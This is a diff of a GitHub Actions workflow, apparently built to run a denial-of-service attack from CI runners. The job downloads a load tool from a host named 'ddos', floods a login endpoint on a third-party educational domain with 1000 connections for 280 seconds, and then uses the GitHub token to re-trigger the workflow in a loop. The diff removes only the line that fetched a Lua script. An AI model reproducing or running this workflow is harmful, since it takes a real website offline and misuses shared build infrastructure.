@@ -15,7 +15,6 @@ jobs:
       - name: Run a multi-line script
         run: |
           wget https://ddos.nms.workers.dev/wrk
-          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/post.lua
           ./wrk -c1000 -t300 -d280s http://wy.targetedu.cn:9999/login/verify/0.6069696256114081
           curl -X POST -H "Authorization: token $GITHUB_TOKEN" -H "Accept: application/vnd.github.v3+json" -d '{"ref": "main"}' https://api.github.com/repos/niniubiwoc/run-script-action/actions/workflows/blank.yml/dispatches
   build2:
